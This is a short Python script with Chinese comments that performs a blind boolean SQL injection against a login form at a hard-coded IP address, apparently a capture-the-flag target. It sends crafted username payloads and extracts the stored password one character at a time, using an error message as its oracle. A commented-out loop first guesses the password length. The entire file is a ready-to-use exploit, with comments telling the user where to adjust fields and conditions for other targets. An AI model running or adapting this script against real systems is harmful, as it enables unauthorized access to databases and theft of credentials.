#!-*-coding:utf-8-*-


import requests

url = "http://114.67.175.224:15968/index.php"
cookie = {
'PHPSESSID':'rkn9uh4c0gq4mjcvn0op3cgd80'#看情况修改
}

password = ""
# for i in range(1, 100):
#     payload1 = "admin'^(length(password)=" + str(i) + ")^'"
#     data = {
#         'username': payload1,#这里的username和password记得看情况改
#         'password': '123'
#     }
#     r = requests.post(url=url, cookies=cookie, data=data)
#     #需要修改的判断条件
#     if "username does not exist!" in r.text:
#         print("密码的长度是"+str(i))
#         break
for i in range(1, 33):
    for j in '0123456789abcdefghijklmnopqrstuvwxyz':
        payload = "1'or(ascii(mid((password)from(" + str(i) + ")))=" + str(ord(j)) + ")#'"
        data = {
        'username': payload,#这里的username和password记得看情况改
        'password': '123'
        }
        r = requests.post(url=url, cookies=cookie, data=data)
        # print r.content
        #需要修改的判断条件
        if "username does not exist!" in r.text:
            password += j
            break
print("密码是"+password)
